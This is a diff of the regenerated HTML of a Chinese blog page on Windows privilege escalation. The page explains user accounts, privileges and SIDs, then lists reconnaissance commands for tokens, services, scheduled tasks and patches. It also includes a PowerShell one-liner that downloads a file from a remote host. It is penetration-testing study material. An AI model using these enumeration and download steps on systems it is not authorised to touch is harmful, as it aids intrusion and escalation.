@@ -17,41 +17,43 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
   <meta name="theme-color" content="#f9fafb">
-  <title>内网：windows提权 - Myblog</title>
+  <title>内网：windows 提权 - Myblog</title>
 
   
-    <meta name="description" content="windows 提权基础知识1.用户和权限模型用户账户（User Account）：Windows 系统中，用户可以拥有不同的权限和角色。管理员账户（Administrator）：拥有系统的完全控制权限。 标准用户（Standard User）：具有受限的权限，不能对系统进行重要的更改。 受限用户（Restricted User）：权限更少，几乎不能修改系统设置。 系统账户（SYSTEM）：这是">
+    <meta name="description" content="基础知识1.用户和权限模型用户账户（User Account）：Windows 系统中，用户可以拥有不同的权限和角色。管理员账户（Administrator）：拥有系统的完全控制权限。 标准用户（Standard User）：具有受限的权限，不能对系统进行重要的更改。 受限用户（Restricted User）：权限更少，几乎不能修改系统设置。 系统账户（SYSTEM）：这是 Windows 操作">
 <meta property="og:type" content="website">
-<meta property="og:title" content="windows提权">
-<meta property="og:url" content="https://cbbzx12.github.io/wiki/%E5%86%85%E7%BD%91/%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83/">
+<meta property="og:title" content="windows 提权">
+<meta property="og:url" content="https://cbbzx12.github.io/wiki/%E5%86%85%E7%BD%91/%E6%8F%90%E6%9D%83/windows%20%E6%8F%90%E6%9D%83/">
 <meta property="og:site_name" content="Myblog">
-<meta property="og:description" content="windows 提权基础知识1.用户和权限模型用户账户（User Account）：Windows 系统中，用户可以拥有不同的权限和角色。管理员账户（Administrator）：拥有系统的完全控制权限。 标准用户（Standard User）：具有受限的权限，不能对系统进行重要的更改。 受限用户（Restricted User）：权限更少，几乎不能修改系统设置。 系统账户（SYSTEM）：这是">
+<meta property="og:description" content="基础知识1.用户和权限模型用户账户（User Account）：Windows 系统中，用户可以拥有不同的权限和角色。管理员账户（Administrator）：拥有系统的完全控制权限。 标准用户（Standard User）：具有受限的权限，不能对系统进行重要的更改。 受限用户（Restricted User）：权限更少，几乎不能修改系统设置。 系统账户（SYSTEM）：这是 Windows 操作">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cbbzx12.github.io/img/spj672lzkVrm2XkE/1762421135653-827c57ea-7636-42c3-a8e7-6d681894e991-627419.png">
-<meta property="og:image" content="https://cbbzx12.github.io/img/spj672lzkVrm2XkE/1762421213968-0e50f866-389a-4c14-8062-a2199acbe6cc-485656.png">
-<meta property="og:image" content="https://cbbzx12.github.io/img/spj672lzkVrm2XkE/1762421584331-664dba0b-f29d-42af-b0d3-538b51561794-573396.png">
-<meta property="og:image" content="https://cbbzx12.github.io/img/spj672lzkVrm2XkE/1762743687636-de3e5b02-ca9f-49de-b219-b3d8d43569d8-545383.png">
-<meta property="og:image" content="https://cbbzx12.github.io/img/spj672lzkVrm2XkE/1762743686694-62bdbec8-0307-42fc-8d3e-8d66b604a29c-888818.png">
-<meta property="og:image" content="https://cbbzx12.github.io/img/spj672lzkVrm2XkE/1762743688265-48d95ad8-62ae-4502-b74c-569545fe0506-597752.png">
-<meta property="og:image" content="https://cbbzx12.github.io/img/spj672lzkVrm2XkE/1762743686713-71c89bdf-3e23-4b31-9e5f-d3a8bfdcdd50-569436.png">
-<meta property="og:image" content="https://cbbzx12.github.io/img/spj672lzkVrm2XkE/1762830846621-d96659d3-189f-48b7-a951-46815135e780-596401.png">
-<meta property="og:image" content="https://cbbzx12.github.io/img/spj672lzkVrm2XkE/1762834968174-47780b91-942d-4ad4-9755-04b2df23371e-343926.png">
-<meta property="og:image" content="https://cbbzx12.github.io/img/spj672lzkVrm2XkE/1762839259244-7ad5ccb1-026a-42a2-ae4a-437e0948f198-715588.png">
-<meta property="og:image" content="https://cbbzx12.github.io/img/spj672lzkVrm2XkE/1762847417729-8b50a8cb-a69d-4c74-a2d9-c0b8480eda4f-517476.png">
-<meta property="og:image" content="https://cbbzx12.github.io/img/spj672lzkVrm2XkE/1762847417968-e6c97d82-0145-4f66-b309-4cb70a90096f-401044.png">
-<meta property="og:image" content="https://cbbzx12.github.io/img/spj672lzkVrm2XkE/1762847417707-26ee99b2-8e71-4faf-b27f-d503838f567f-264604.png">
-<meta property="og:image" content="https://cbbzx12.github.io/img/spj672lzkVrm2XkE/1762862422019-53b01b90-902a-48e5-9847-b7a76c576f1f-657044.png">
-<meta property="og:image" content="https://cbbzx12.github.io/img/spj672lzkVrm2XkE/1762862422271-786151b2-d924-49b8-abc3-8c0e2e53585e-293798.png">
-<meta property="og:image" content="https://cbbzx12.github.io/img/spj672lzkVrm2XkE/1762855939632-123d982f-aca4-46ba-b202-16cd9b60bf08-767876.png">
-<meta property="og:image" content="https://cbbzx12.github.io/img/spj672lzkVrm2XkE/1762855939767-ec76a1d0-9cf6-4ae1-a244-a4f2218986b4-716622.png">
-<meta property="og:image" content="https://cbbzx12.github.io/img/spj672lzkVrm2XkE/1762855939785-92a92d92-e2f7-46e1-a23e-06c5e41dcfd9-273796.png">
-<meta property="og:image" content="https://cbbzx12.github.io/img/spj672lzkVrm2XkE/1762855990379-47efadbf-3f57-4e3e-a4dc-6a145a3b970f-093483.png">
-<meta property="og:image" content="https://cbbzx12.github.io/img/spj672lzkVrm2XkE/1762855990362-eb9ca6da-f4d1-4e68-9344-b88913780a1e-992928.png">
-<meta property="article:published_time" content="2025-12-23T06:58:16.136Z">
-<meta property="article:modified_time" content="2025-12-23T06:58:16.136Z">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/__latex/052d725fa3c87498abbeb7b3547bb517.svg">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/__latex/a43a71e7d4790d705121b2468d925882.svg">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762421135653-827c57ea-7636-42c3-a8e7-6d681894e991.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762421213968-0e50f866-389a-4c14-8062-a2199acbe6cc.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762421584331-664dba0b-f29d-42af-b0d3-538b51561794.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762743687636-de3e5b02-ca9f-49de-b219-b3d8d43569d8.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762743686694-62bdbec8-0307-42fc-8d3e-8d66b604a29c.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762743688265-48d95ad8-62ae-4502-b74c-569545fe0506.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762743686713-71c89bdf-3e23-4b31-9e5f-d3a8bfdcdd50.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762830846621-d96659d3-189f-48b7-a951-46815135e780.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762834968174-47780b91-942d-4ad4-9755-04b2df23371e.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762839259244-7ad5ccb1-026a-42a2-ae4a-437e0948f198.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762847417729-8b50a8cb-a69d-4c74-a2d9-c0b8480eda4f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762847417968-e6c97d82-0145-4f66-b309-4cb70a90096f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762847417707-26ee99b2-8e71-4faf-b27f-d503838f567f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762862422019-53b01b90-902a-48e5-9847-b7a76c576f1f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762862422271-786151b2-d924-49b8-abc3-8c0e2e53585e.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762855939632-123d982f-aca4-46ba-b202-16cd9b60bf08.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762855939767-ec76a1d0-9cf6-4ae1-a244-a4f2218986b4.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762855939785-92a92d92-e2f7-46e1-a23e-06c5e41dcfd9.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762855990379-47efadbf-3f57-4e3e-a4dc-6a145a3b970f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762855990362-eb9ca6da-f4d1-4e68-9344-b88913780a1e.png">
+<meta property="article:published_time" content="2025-12-23T07:42:12.891Z">
+<meta property="article:modified_time" content="2025-12-23T07:42:12.891Z">
 <meta property="article:author" content="bug_001">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cbbzx12.github.io/img/spj672lzkVrm2XkE/1762421135653-827c57ea-7636-42c3-a8e7-6d681894e991-627419.png">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/__latex/052d725fa3c87498abbeb7b3547bb517.svg">
   
   
   
@@ -67,7 +69,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Website","@id":"https://cbbzx12.github.io/wiki/%E5%86%85%E7%BD%91/%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83/","author":{"@type":"Person","name":"bug_001","sameAs":[]},"name":"windows提权","description":"windows 提权基础知识1.用户和权限模型用户账户（User Account）：Windows 系统中，用户可以拥有不同的权限和角色。管理员账户（Administrator）：拥有系统的完全控制权限。\n标准用户（Standard User）：具有受限的权限，不能对系统进行重要的更改。\n受限用户（Restricted User）：权限更少，几乎不能修改系统设置。\n系统账户（SYSTEM）：...","url":"https://cbbzx12.github.io/wiki/%E5%86%85%E7%BD%91/%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83/"}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Website","@id":"https://cbbzx12.github.io/wiki/%E5%86%85%E7%BD%91/%E6%8F%90%E6%9D%83/windows%20%E6%8F%90%E6%9D%83/","author":{"@type":"Person","name":"bug_001","sameAs":[]},"name":"windows 提权","description":"基础知识1.用户和权限模型用户账户（User Account）：Windows 系统中，用户可以拥有不同的权限和角色。管理员账户（Administrator）：拥有系统的完全控制权限。\n标准用户（Standard User）：具有受限的权限，不能对系统进行重要的更改。\n受限用户（Restricted User）：权限更少，几乎不能修改系统设置。\n系统账户（SYSTEM）：这是 Windows...","url":"https://cbbzx12.github.io/wiki/%E5%86%85%E7%BD%91/%E6%8F%90%E6%9D%83/windows%20%E6%8F%90%E6%9D%83/"}</script>
   
 </head>
 <body><div class="sitebg"><div class="siteblur"></div></div>
@@ -105,20 +107,20 @@
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
 
   <span class="sep"></span>
-  <a class="cap breadcrumb" href="/wiki/%E5%86%85%E7%BD%91/%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83/">windows提权</a>
+  <a class="cap breadcrumb" href="/wiki/%E5%86%85%E7%BD%91/%E6%8F%90%E6%9D%83/windows%20%E6%8F%90%E6%9D%83/">windows 提权</a>
   </div>
-<div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2025-12-23T06:58:16.136Z">2025-12-23</time></span></div></div></div>
+<div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2025-12-23T07:42:12.891Z">2025-12-23</time></span></div></div></div>
     
     <div class="bottom only-title">
       
       <div class="text-area">
-        <h1 class="text title"><span>windows提权</span></h1>
+        <h1 class="text title"><span>windows 提权</span></h1>
         
       </div>
     </div>
     
   </div>
-  </div><article class="md-text content"><h1 id="windows-提权"><a href="#windows-提权" class="headerlink" title="windows 提权"></a>windows 提权</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="1-用户和权限模型"><a href="#1-用户和权限模型" class="headerlink" title="1.用户和权限模型"></a>1.用户和权限模型</h3><h4 id="用户账户（User-Account）：Windows-系统中，用户可以拥有不同的权限和角色。"><a href="#用户账户（User-Account）：Windows-系统中，用户可以拥有不同的权限和角色。" class="headerlink" title="用户账户（User Account）：Windows 系统中，用户可以拥有不同的权限和角色。"></a>用户账户（User Account）：Windows 系统中，用户可以拥有不同的权限和角色。</h4><p>管理员账户（Administrator）：拥有系统的完全控制权限。</p>
+  </div><article class="md-text content"><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="1-用户和权限模型"><a href="#1-用户和权限模型" class="headerlink" title="1.用户和权限模型"></a>1.用户和权限模型</h3><h4 id="用户账户（User-Account）：Windows-系统中，用户可以拥有不同的权限和角色。"><a href="#用户账户（User-Account）：Windows-系统中，用户可以拥有不同的权限和角色。" class="headerlink" title="用户账户（User Account）：Windows 系统中，用户可以拥有不同的权限和角色。"></a>用户账户（User Account）：Windows 系统中，用户可以拥有不同的权限和角色。</h4><p>管理员账户（Administrator）：拥有系统的完全控制权限。</p>
 <p>标准用户（Standard User）：具有受限的权限，不能对系统进行重要的更改。</p>
 <p>受限用户（Restricted User）：权限更少，几乎不能修改系统设置。</p>
 <p>系统账户（SYSTEM）：这是 Windows 操作系统内核的权限级别，比管理员更高。攻击者通过提升权限，往往会争取系统权限。</p>
@@ -156,7 +158,7 @@
 </li>
 </ul>
 <h3 id="3-安全标识符-SID"><a href="#3-安全标识符-SID" class="headerlink" title="3.安全标识符 (SID)"></a><font style="color:rgb(79, 79, 79);">3.安全标识符 (SID)</font></h3><p><font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);">安全标识符（SID） 用于唯一标识用户、组或计算机。SID 是一种字符串，用来标识与资源访问相关的主体</font></p>
-<p><font style="color:rgb(51, 51, 51);">S-1-5-18 (LocalSystem)</font><font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);">\ </font><font style="color:rgb(51, 51, 51);">S-1-5-19 (LocalService)</font><font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);">\ </font><font style="color:rgb(51, 51, 51);">S-1-5-20 (NetworkService)</font><font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);">\ </font><font style="color:rgb(51, 51, 51);">S-1-5-32-544 (Administrators)</font><font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);">\ </font><font style="color:rgb(51, 51, 51);">S-1-5-32-545 (Users)</font><font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);">\ </font><font style="color:rgb(51, 51, 51);">S-1-5-32-550 (PrintOperators)</font></p>
+<p><font style="color:rgb(51, 51, 51);">S-1-5-18 (LocalSystem)</font><font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);"><br></font><font style="color:rgb(51, 51, 51);">S-1-5-19 (LocalService)</font><font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);"><br></font><font style="color:rgb(51, 51, 51);">S-1-5-20 (NetworkService)</font><font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);"><br></font><font style="color:rgb(51, 51, 51);">S-1-5-32-544 (Administrators)</font><font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);"><br></font><font style="color:rgb(51, 51, 51);">S-1-5-32-545 (Users)</font><font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);"><br></font><font style="color:rgb(51, 51, 51);">S-1-5-32-550 (PrintOperators)</font></p>
 <h4 id="查询-SID"><a href="#查询-SID" class="headerlink" title="查询 SID"></a><font style="color:rgb(79, 79, 79);">查询 SID</font></h4><ul>
 <li><font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);">wmic useraccount get name,sid</font></li>
 </ul>
@@ -176,7 +178,7 @@
 <p>1001：这是特定主体的唯一标识符，如用户、组或服务账户。</p>
 <p>唯一标识符：最后的数字（如 “1001”）标识特定的用户或服务账户。</p>
 <p><font style="color:rgb(51, 51, 51);">针对 S-1-5-21-1004336348-1177238915-682003330-512进行解析，可以知道</font></p>
-<p><font style="color:rgb(51, 51, 51);">SID 的版本号是 1\ </font><font style="color:rgb(51, 51, 51);">主标识值是 5，代表 NT 权限\ </font><font style="color:rgb(51, 51, 51);">域相关的子标识值是 21-1004336348-1177238915-682003330\ </font><font style="color:rgb(51, 51, 51);">RID 是 512，代表 DomainAdmins</font></p>
+<p><font style="color:rgb(51, 51, 51);">SID 的版本号是 1<br></font><font style="color:rgb(51, 51, 51);">主标识值是 5，代表 NT 权限<br></font><font style="color:rgb(51, 51, 51);">域相关的子标识值是 21-1004336348-1177238915-682003330<br></font><font style="color:rgb(51, 51, 51);">RID 是 512，代表 DomainAdmins</font></p>
 <h3 id="4-基本命令"><a href="#4-基本命令" class="headerlink" title="4.基本命令"></a>4.基本命令</h3><table>
 <thead>
 <tr>
@@ -185,103 +187,103 @@
 </tr>
 </thead>
 <tbody><tr>
-<td><code><font style="color:rgb(51, 51, 51);">systeminfo</font></code></td>
+<td><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;systeminfo&lt;/font&gt;</code></td>
 <td><font style="color:rgb(51, 51, 51);">打印系统信息</font></td>
 </tr>
 <tr>
-<td><code><font style="color:rgb(51, 51, 51);">whoami</font></code></td>
+<td><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;whoami&lt;/font&gt;</code></td>
 <td><font style="color:rgb(51, 51, 51);">获取当前用户名</font></td>
 </tr>
 <tr>
-<td><code><font style="color:rgb(51, 51, 51);">whoami /priv</font></code></td>
+<td><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;whoami /priv&lt;/font&gt;</code></td>
 <td><font style="color:rgb(51, 51, 51);">列出当前帐户权限</font></td>
 </tr>
 <tr>
-<td><code><font style="color:rgb(51, 51, 51);">ipconfig</font></code></td>
+<td><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;ipconfig&lt;/font&gt;</code></td>
 <td><font style="color:rgb(51, 51, 51);">网络配置信息</font></td>
 </tr>
 <tr>
-<td><code><font style="color:rgb(51, 51, 51);">ipconfig /displaydns</font></code></td>
+<td><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;ipconfig /displaydns&lt;/font&gt;</code></td>
 <td><font style="color:rgb(51, 51, 51);">显示 DNS 缓存</font></td>
 </tr>
 <tr>
-<td><code><font style="color:rgb(51, 51, 51);">route print</font></code></td>
+<td><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;route print&lt;/font&gt;</code></td>
 <td><font style="color:rgb(51, 51, 51);">打印路由表</font></td>
 </tr>
 <tr>
-<td><code><font style="color:rgb(51, 51, 51);">arp -a</font></code></td>
+<td><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;arp -a&lt;/font&gt;</code></td>
 <td><font style="color:rgb(51, 51, 51);">打印 ARP 表</font></td>
 </tr>
 <tr>
-<td><code><font style="color:rgb(51, 51, 51);">hostname</font></code></td>
+<td><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;hostname&lt;/font&gt;</code></td>
 <td><font style="color:rgb(51, 51, 51);">获取主机名</font></td>
 </tr>
 <tr>
-<td><code><font style="color:rgb(51, 51, 51);">net user</font></code></td>
+<td><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;net user&lt;/font&gt;</code></td>
 <td><font style="color:rgb(51, 51, 51);">列出用户</font></td>
 </tr>
 <tr>
-<td><code><font style="color:rgb(51, 51, 51);">net localgroup</font></code></td>
+<td><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;net localgroup&lt;/font&gt;</code></td>
 <td><font style="color:rgb(51, 51, 51);">列出所有组</font></td>
 </tr>
 <tr>
-<td><code><font style="color:rgb(51, 51, 51);">net view \127.0.0.1</font></code></td>
+<td><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;net view \\127.0.0.1&lt;/font&gt;</code></td>
 <td><font style="color:rgb(51, 51, 51);">列出打开到当前计算机的会话</font></td>
 </tr>
 <tr>
-<td><code><font style="color:rgb(51, 51, 51);">net session</font></code></td>
+<td><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;net session&lt;/font&gt;</code></td>
 <td><font style="color:rgb(51, 51, 51);">列出其他机器打开的会话</font></td>
 </tr>
 <tr>
-<td><code><font style="color:rgb(51, 51, 51);">netsh firewall show config</font></code></td>
+<td><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;netsh firewall show config&lt;/font&gt;</code></td>
 <td><font style="color:rgb(51, 51, 51);">显示防火墙配置</font></td>
 </tr>
 <tr>
-<td><code><font style="color:rgb(51, 51, 51);">DRIVERQUERY</font></code></td>
+<td><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;DRIVERQUERY&lt;/font&gt;</code></td>
 <td><font style="color:rgb(51, 51, 51);">列出已安装的驱动</font></td>
 </tr>
 <tr>
-<td><code><font style="color:rgb(51, 51, 51);">tasklist /svc</font></code></td>
+<td><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;tasklist /svc&lt;/font&gt;</code></td>
 <td><font style="color:rgb(51, 51, 51);">列出服务任务</font></td>
 </tr>
 <tr>
-<td><code><font style="color:rgb(51, 51, 51);">net start</font></code></td>
+<td><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;net start&lt;/font&gt;</code></td>
 <td><font style="color:rgb(51, 51, 51);">列出启动的服务</font></td>
 </tr>
 <tr>
-<td><code><font style="color:rgb(51, 51, 51);">dir /s foo</font></code></td>
+<td><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;dir /s foo&lt;/font&gt;</code></td>
 <td><font style="color:rgb(51, 51, 51);">在目录中搜索包含指定字符的项目</font></td>
 </tr>
 <tr>
-<td><code><font style="color:rgb(51, 51, 51);">sc query</font></code></td>
+<td><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;sc query&lt;/font&gt;</code></td>
 <td><font style="color:rgb(51, 51, 51);">列出所有服务</font></td>
 </tr>
 <tr>
-<td><code><font style="color:rgb(51, 51, 51);">sc qc ServiceName</font></code></td>
+<td><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;sc qc ServiceName&lt;/font&gt;</code></td>
 <td><font style="color:rgb(51, 51, 51);">找到指定服务的路径</font></td>
 </tr>
 <tr>
-<td><code><font style="color:rgb(51, 51, 51);">shutdown /r /t 0</font></code></td>
+<td><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;shutdown /r /t 0&lt;/font&gt;</code></td>
 <td><font style="color:rgb(51, 51, 51);">立即重启</font></td>
 </tr>
 <tr>
-<td><code><font style="color:rgb(51, 51, 51);">type file.txt</font></code></td>
+<td><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;type file.txt&lt;/font&gt;</code></td>
 <td><font style="color:rgb(51, 51, 51);">打印文件内容</font></td>
 </tr>
 <tr>
-<td><code><font style="color:rgb(51, 51, 51);">icacls &quot;C:\Example&quot;</font></code></td>
+<td><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;icacls &quot;C:\Example&quot;&lt;/font&gt;</code></td>
 <td><font style="color:rgb(51, 51, 51);">列出权限</font></td>
 </tr>
 <tr>
-<td><code><font style="color:rgb(51, 51, 51);">wmic qfe get Caption,Description,HotFixID,InstalledOn</font></code></td>
+<td><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;wmic qfe get Caption,Description,HotFixID,InstalledOn&lt;/font&gt;</code></td>
 <td><font style="color:rgb(51, 51, 51);">列出已安装的补丁</font></td>
 </tr>
 <tr>
-<td><code><font style="color:rgb(51, 51, 51);">(New-Object System.Net.WebClient).DownloadFile(&quot;<a target="_blank" rel="noopener" href="http://host/file%22,%22C:/LocalPath">http://host/file&quot;,&quot;C:\LocalPath</a>&quot;)</font></code></td>
+<td><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;(New-Object System.Net.WebClient).DownloadFile(&quot;http://host/file&quot;,&quot;C:\LocalPath&quot;)&lt;/font&gt;</code></td>
 <td><font style="color:rgb(51, 51, 51);">利用 PowerShell 远程下载文件到本地</font></td>
 </tr>
 <tr>
-<td><code><font style="color:rgb(51, 51, 51);">accesschk.exe -qwsu &quot;Group&quot;</font></code></td>
+<td><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;accesschk.exe -qwsu &quot;Group&quot;&lt;/font&gt;</code></td>
 <td><font style="color:rgb(51, 51, 51);">修改对象权限</font><br/><font style="color:rgb(51, 51, 51);"></font></td>
 </tr>
 </tbody></table>
@@ -297,57 +299,57 @@
 </thead>
 <tbody><tr>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">系统与补丁（System &amp; Patches）</font></strong></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">systeminfo</font></code><br/><font style="color:rgba(0, 0, 0, 0.88);">；</font><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">wmic qfe get</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;systeminfo&lt;/font&gt;</code><br/><font style="color:rgba(0, 0, 0, 0.88);">；</font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;wmic qfe get&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">确定操作系统版本、安装日期及已安装的热修复补丁（hotfixes）。</font></td>
 </tr>
 <tr>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">当前身份与权限（Current Identity &amp; Privileges）</font></strong></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">whoami</font></code><br/><font style="color:rgba(0, 0, 0, 0.88);">；</font><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">whoami /priv</font></code><br/><font style="color:rgba(0, 0, 0, 0.88);">；</font><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">whoami /all</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;whoami&lt;/font&gt;</code><br/><font style="color:rgba(0, 0, 0, 0.88);">；</font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;whoami /priv&lt;/font&gt;</code><br/><font style="color:rgba(0, 0, 0, 0.88);">；</font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;whoami /all&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">识别当前用户令牌、权限（如SeImpersonate、SeDebug等）及用户组信息。</font></td>
 </tr>
 <tr>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">用户与组（Users &amp; Groups）</font></strong></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">net user</font></code><br/><font style="color:rgba(0, 0, 0, 0.88);">；</font><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">net localgroup administrators</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;net user&lt;/font&gt;</code><br/><font style="color:rgba(0, 0, 0, 0.88);">；</font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;net localgroup administrators&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">枚举本地用户、管理员组成员。</font></td>
 </tr>
 <tr>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">服务与启动项（Services &amp; Startup）</font></strong></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">sc query state=all</font></code><br/><font style="color:rgba(0, 0, 0, 0.88);">；</font><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">sc qc &lt;服务名&gt;</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;sc query state=all&lt;/font&gt;</code><br/><font style="color:rgba(0, 0, 0, 0.88);">；</font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;sc qc &lt;服务名&gt;&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">查找服务、启动模式及二进制路径。</font></td>
 </tr>
 <tr>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">计划任务（Scheduled Tasks）</font></strong></td>
-<td><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">schtasks /query /fo LIST /v</font></code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;schtasks /query /fo LIST /v&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">枚举计划任务及详细信息。</font></td>
 </tr>
 <tr>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">文件系统与ACL（File System &amp; ACL）</font></strong></td>
